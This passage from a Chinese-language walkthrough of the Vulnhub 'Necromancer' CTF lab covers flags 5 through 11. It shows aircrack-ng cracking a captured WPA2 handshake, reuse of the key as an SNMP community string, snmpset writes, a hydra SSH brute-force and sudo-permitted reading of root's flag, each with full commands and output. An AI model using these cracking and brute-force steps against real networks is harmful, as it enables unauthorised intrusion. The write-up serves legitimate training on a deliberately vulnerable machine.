└─$ echo "ea50536158db50247e110a6c89fcf3d3" | nc -u -w 3 10.10.10.102 31337
Chant had no affect! Try in a different tongue!
```

感觉这又是一个md5

反查为 blackmagic

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ echo "blackmagic" | nc -u -w 3 10.10.10.102 31337


As you chant the words, a hissing sound echoes from the ice walls.

The blue aura disappears from the cave entrance.

You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.

You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.

The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.

Suddenly, you are attacked by a swarm of bats!

You aimlessly thrash at the air in front of you!

The bats continue their relentless attack, until.... silence.

Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.

Looking towards one of the torches, you see something on the cave wall.

You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.

/thenecromancerwillabsorbyoursoul

flag5{0766c36577af58e15545f099a3b15e60}
```

## 获取flag6

/thenecromancerwillabsorbyoursoul 这是得到的新路径

访问得到新的flag6同时又是一串文字和图片

```html
| | |---| |
<html>
  | |<head>
    | |
    <title>The Door</title>
    | |</head
  >| |
  <body bgcolor="#000000" link="green" vlink="green" alink="green">
    | |<font color="green"
      >| |flag6{b1c3ed8f1db4258e4dcb0ce565f6dc03}<br /><br />| |You continue to make your way
      through the cave.<br /><br />| |In the distance you can see a familiar flicker of light moving
      in and out of the shadows. <br /><br />| |As you get closer to the light you can hear faint
      footsteps, followed by the sound of a heavy door opening.<br /><br />| |You move closer, and
      then stop frozen with fear.<br /><br />| |It's the
      <a href="[./necromancer](http://10.10.10.102/thenecromancerwillabsorbyoursoul/necromancer)"
        >necromancer!</a
      ><br /><br />| |<img
        src="[../pics/necromancer.jpg](http://10.10.10.102/pics/necromancer.jpg)"
      />| |
      <p>
        <font size="2"
          >Image copyright:<a
            href="[http://www.deviantart.com/art/The-Warlock-Necromancer-339634655](http://www.deviantart.com/art/The-Warlock-Necromancer-339634655)"
            target="_blank"
          >
            Manzanedo</a
          ></font
        >| |
      </p>
      <br /><br /><br />| |Again he stares at you with deathly hollow eyes. <br /><br />| |He is
      standing in a doorway; a staff in one hand, and an object in the other. <br /><br />|
      |Smirking, the necromancer holds the staff and the object in the air.<br /><br />| |He points
      his staff in your direction, and the stench of death and decay begins to fill the air.<br /><br />|
      |You stare into his eyes and then.......<br /><br /><br /><br /><br /><br /><br /><br /><br />|
      |...... darkness. You open your eyes and find yourself lying on the damp floor of the cave.<br /><br />|
      |The amulet must have saved you from whatever spell the necromancer had cast.<br /><br />|
      |You stand to your feet. Behind you, only darkness.<br /><br />| |Before you, a large door
      with the symbol of a skull engraved into the surface. <br /><br />| |Looking closer at the
      skull, you can see u161 engraved into the forehead.<br /><br />| |</font
    >| |
  </body>
  | |
</html>
| ||
```

3条线索

1. 链接：./necromancer（完整路径是 /thenecromancerwillabsorbyoursoul/necromancer）

点击这个链接提示我们要下载

2. 图片：../pics/necromancer.jpg

3. 文字提示：u161（UDP 161，对应 SNMP 服务）

## 获取flag7

下载这个新文件

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ file necromancer
necromancer: bzip2 compressed data, block size = 900k
```

bzip2格式先解压

```shell
bzip2  -d necromancer
```

解出来的是 tar，再 tar xf

```shell
tar xf necromancer.out && ls -la necromancer.cap
```

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ file necromancer.cap
necromancer.cap: pcap capture file, microsecond ts (little-endian) - version 2.4 (802.11, capture length 65535)
```

### 抓包分析：抓到 WPA 握手

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ capinfos necromancer.cap
Number of packets:   2,197
File encapsulation:  IEEE 802.11 Wireless LAN
Capture duration:    11.360937 seconds
```

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ tshark -r necromancer.cap -q -z io,phs

frame                                    frames:2197 bytes:45066
  wlan                                   frames:2197 bytes:45066
    llc                                  frames:5 bytes:789
      eapol                              frames:5 bytes:789
```

协议栈里只有 wlan 加上 5 个 EAPOL，其余全是 Beacon/Probe 管理帧和 RTS/CTS/ACK 控制帧，说明抓到了一个 WPA/WPA2 四次握手。

看目标网络与握手细节：

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ tshark -r necromancer.cap -Y "wlan.fc.type_subtype==8" -T fields -e wlan.bssid -e wlan.ssid
c4:12:f5:0d:5e:95	community

┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ tshark -r necromancer.cap -Y "eapol" -T fields -e wlan_rsna_eapol.keydes.msgnr
1
2
3
4
```

SSID 是 `community`，加密方式 WPA2-PSK（AES-CCM），msg1 里还带 PMKID，可以直接爆破口令。

### 爆破 WPA 口令

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ gunzip -c /usr/share/wordlists/rockyou.txt.gz > rockyou.txt

┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ aircrack-ng -w rockyou.txt necromancer.cap

                               Aircrack-ng 1.7

      [00:00:06] 44593/14344392 keys tested (8053.39 k/s)

                           KEY FOUND! [ death2all ]
```

得到 WiFi 口令：

```text
death2all
```

### 用口令作 SNMP community 打 161

flag6 给的线索是 u161（UDP 161 = SNMP），而这里爆出来的 wifi 口令正好就是 SNMP 的 community string：

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ snmpwalk -v2c -c death2all 10.10.10.102 1.3.6.1.2.1.1
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
```

`sysLocation` 泄露了读写 community：`death2allrw`（death2all + rw）。

### 用读写 community 解锁 door

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ snmpset -c death2allrw -v 1 10.10.10.102 iso.3.6.1.2.1.1.6.0 s Unlocked
iso.3.6.1.2.1.1.6.0 = STRING: "Unlocked"
```

### 解锁后再读 system 组：

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ snmpwalk -v2c -c death2allrw 10.10.10.102 1.3.6.1.2.1.1
iso.3.6.1.2.1.1.4.0 = STRING: "The door is unlocked! You may now enter the Necromancer's lair!"
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"
```

## 获取flag8

-t22可能是提示22端口开放了

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ sudo nmap --min-rate 10000 -p- 10.10.10.102
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 16:45 -0400
Nmap scan report for 10.10.10.102
Host is up (0.00078s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:0C:29:27:05:E2 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.93 seconds

```

没错是开放的

flag7里面的字符依旧符合md5特征

反查得到 demonslayer 像个用户名

这里我们爆破一下

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ hydra -l demonslayer -P /tmp/rockyou.txt -t 4 -f ssh://10.10.10.102

Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-06 16:49:00
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.10.102:22/
[22][ssh] host: 10.10.10.102   login: demonslayer   password: 12345678
[STATUS] attack finished for 10.10.10.102 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-06 16:49:02
```

得到密码12345678

### ssh登陆

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Necromancer]
└─$ ssh demonslayer@10.10.10.102
The authenticity of host '10.10.10.102 (10.10.10.102)' can't be established.
ED25519 key fingerprint is: SHA256:WZAJ9VRjKUurS1xoQ16rOAxPl++K6VW/pSEkaXhnApA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.102' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
demonslayer@10.10.10.102's password:

          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
                               THE NECROMANCER!
                                 by  @xerubus

$
```

```shell
$ ls -liah;id;pwd;whoami;
total 40
16384 drwxr-xr-x  3 demonslayer  demonslayer   512B Jun 23  2016 .
    2 drwxr-xr-x  3 root         wheel         512B May 11  2016 ..
16387 -rw-r--r--  1 demonslayer  demonslayer    87B May 11  2016 .Xdefaults
16388 -rw-r--r--  1 demonslayer  demonslayer   773B May 11  2016 .cshrc
16389 -rw-r--r--  1 demonslayer  demonslayer   103B May 11  2016 .cvsrc
16390 -rw-r--r--  1 demonslayer  demonslayer   359B May 11  2016 .login
16391 -rw-r--r--  1 demonslayer  demonslayer   175B May 11  2016 .mailrc
16392 -rw-r--r--  1 demonslayer  demonslayer   218B May 11  2016 .profile
16385 drwx------  2 demonslayer  demonslayer   512B May 11  2016 .ssh
16393 -rw-r--r--  1 demonslayer  demonslayer   706B May 11  2016 flag8.txt
uid=1000(demonslayer) gid=1000(demonslayer) groups=1000(demonslayer)
/home/demonslayer
demonslayer
$ cat flag8.txt
You enter the Necromancer's Lair!

A stench of decay fills this place.

Jars filled with parts of creatures litter the bookshelves.

A fire with flames of green burns coldly in the distance.

Standing in the middle of the room with his back to you is the Necromancer.

In front of him lies a corpse, indistinguishable from any living creature you have seen before.

He holds a staff in one hand, and the flickering object in the other.

"You are a fool to follow me here!  Do you not know who I am!"

The necromancer turns to face you.  Dark words fill the air!

"You are damned already my friend.  Now prepare for your own death!"

Defend yourself!  Counter attack the Necromancer's spells at u777!

```

## 获取flag9 flag10

这一阶段已经不属于技术利用，而是题目作者设计的知识问答，需要根据 Necromancer 中的文学、奇幻作品和彩蛋回答

```shell
$ nc -u localhost 777



** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path?
```

nc -u 之后回车两次

问题

```shell
** You only have 2 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path?  Kelewan


flag8{55a6af2ca3fee9f2fef81d20743bda2c}



** You only have 2 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Who did Johann Faust VIII make a deal with?  Mephistopheles


flag9{713587e17e796209d1df4c9c2c2d2966}



** You only have 2 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Who is tricked into passing the Ninth Gate?  Hedge


flag10{8dc6486d2c63cafcdc6efbba2be98ee4}

A great flash of light knocks you to the ground; momentarily blinding you!

As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.

An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.

The room is silent.

You walk over to where the Necromancer once stood.
```

三个答案分别对应：

1. Kelewan
   - 问题：Where do the Black Robes practice magic of the Greater Path?
   - 答案：Kelewan
   - 这是 Raymond E. Feist 的《Riftwar》系列世界观里的地点。
   - **Black Robes（黑袍法师）**属于 Kelewan 的魔法体系。
   - Greater Path 是他们所修习的高级魔法道路。
   - 所以题目实际上是在考你是否认识《Riftwar》世界观。
2. Mephistopheles
   - 问题：Who did Johann Faust VIII make a deal with?
   - 答案：Mephistopheles
   - 这里明显是在引用 **浮士德（Faust）**传说。
   - Faust 与恶魔 **Mephistopheles（梅菲斯特）**达成交易。
   - Johann Faust VIII 是 Necromancer 题目自己构造/引用的名称，但核心就是经典的 Faust 故事。
3. Hedge
   - 问题：Who is tricked into passing the Ninth Gate?
   - 答案：Hedge
   - 这是 **The Ninth Gate（第九道门）**相关的设定。
   - Hedge 是被欺骗、最终通过 Ninth Gate 的人物。
   - 这里同样属于题目的文学/神秘学彩蛋，而不是 Linux/SSH 知识。

## 获取flag11

进行提权尝试，目标是flag11

```shell
$ sudo -l
Matching Defaults entries for demonslayer on thenecromancer:
    env_keep+="FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK"

User demonslayer may run the following commands on thenecromancer:
    (ALL) NOPASSWD: /bin/cat /root/flag11.txt
```

可以以 root 权限、无需密码运行 /bin/cat /root/flag11.txt

```shell
Suddenly you feel dizzy and fall to the ground!

As you open your eyes you find yourself staring at a computer screen.

Congratulations!!! You have conquered......

          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
                               THE NECROMANCER!
                                 by  @xerubus

                   flag11{42c35828545b926e79a36493938ab1b1}


Big shout out to Dook and Bull for being test bunnies.

Cheers OJ for the obfuscation help.

Thanks to SecTalks Brisbane and their sponsors for making these CTF challenges possible.

"========================================="
"  xerubus (@xerubus) - www.mogozobo.com  "
"========================================="
```

这里并不是常规意义上的“提权到 root shell”，而是 sudo 明确允许当前用户以 root 身份执行 /bin/cat /root/flag11.txt。由于目标就是读取 flag11，因此无需进一步寻找 root shell
